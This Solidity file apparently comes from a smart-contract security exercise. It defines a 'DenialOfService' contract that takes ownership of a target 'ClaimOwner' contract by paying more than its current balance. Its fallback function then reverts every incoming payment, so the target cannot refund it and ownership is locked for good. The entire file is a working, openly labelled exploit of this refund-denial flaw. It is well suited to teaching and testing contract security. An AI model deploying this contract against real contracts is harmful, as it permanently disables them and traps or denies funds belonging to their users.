// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./ClaimOwner.sol";
// interface IClaimOwner {
//     function claimOwner() external payable;
//     function currentBal() external view returns (uint);
//     function currentOwner() external view returns (address);
// }

contract DenialOfService {
    ClaimOwner public target;

    constructor(address _target) {
        target = ClaimOwner(_target);
    }

    // Attack the claimOwner function
    function attack() external payable {
        require(msg.value > target.currentBal(), "Insufficient funds for attack");
        target.claimOwner{value: msg.value}();
    }

    // Prevent funds from being received, causing DoS
    fallback() external payable {
        revert("Preventing funds transfer");
    }
}
